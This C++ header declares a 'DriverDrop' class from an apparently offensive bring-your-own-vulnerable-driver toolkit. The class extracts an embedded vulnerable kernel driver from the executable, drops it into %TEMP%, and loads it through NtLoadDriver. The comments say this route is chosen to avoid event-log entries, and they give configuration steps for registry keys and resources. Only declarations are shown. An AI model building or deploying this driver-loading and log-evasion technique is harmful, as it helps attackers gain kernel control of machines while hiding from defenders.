#pragma once

// DriverDrop — extract an embedded vulnerable driver and load it at runtime.
//
// This is the "last resort" BYOVD path when no pre-installed vulnerable driver
// is found on the system.  The EXE embeds a .sys binary as a RCDATA resource;
// DriverDrop drops it to a random %TEMP% path, loads it via NtLoadDriver
// (more stealthy than SCM — no event log entry), and provides the device name
// for Byovd to open.
//
// NtLoadDriver requires SE_LOAD_DRIVER_PRIVILEGE, which is present in the
// admin token that executors always request.
//
// To enable, add to your .rc file:
//   IDR_VULN_DRIVER RCDATA "drivers\your_driver.sys"
//
// And define in project preprocessor:
//   BYOVD_DRIVER_RESOURCE=101
//   BYOVD_DEVICE_NAME=L"\\\\.\\YourDeviceName"
//   BYOVD_REG_KEY=L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\YourSvcName"

#include <Windows.h>
#include <winternl.h>
#include <string>

namespace vt {

class DriverDrop {
public:
    DriverDrop() = default;
    ~DriverDrop() { cleanup(); }

    // Extract resource RESOURCE_ID from this EXE, drop to temp, load via
    // NtLoadDriver.  Returns true if the driver is now running.
    bool load(WORD resource_id, const wchar_t* svc_name, const wchar_t* reg_key);

    // Unload driver (NtUnloadDriver) + delete temp file.
    void cleanup();

    bool loaded() const { return m_loaded; }
    const std::wstring& dropped_path() const { return m_path; }

private:
    bool        m_loaded = false;
    std::wstring m_path;
    std::wstring m_reg_key;

    // Privilege helpers.
    static bool enable_load_driver_privilege();

    // Write resource to temp file.  Returns path or empty on failure.
    static std::wstring extract_resource(WORD id, const wchar_t* tmp_dir);

    // Create the registry key for NtLoadDriver and set ImagePath.
    bool create_registry_key(const wchar_t* reg_key, const wchar_t* image_path);
    void delete_registry_key(const wchar_t* reg_key);

    using NtLoadDriver_t   = LONG(NTAPI*)(PUNICODE_STRING);
    using NtUnloadDriver_t = LONG(NTAPI*)(PUNICODE_STRING);
    static NtLoadDriver_t   get_NtLoadDriver();
    static NtUnloadDriver_t get_NtUnloadDriver();
    static void init_unicode(UNICODE_STRING* us, const wchar_t* buf);
};

} // namespace vt
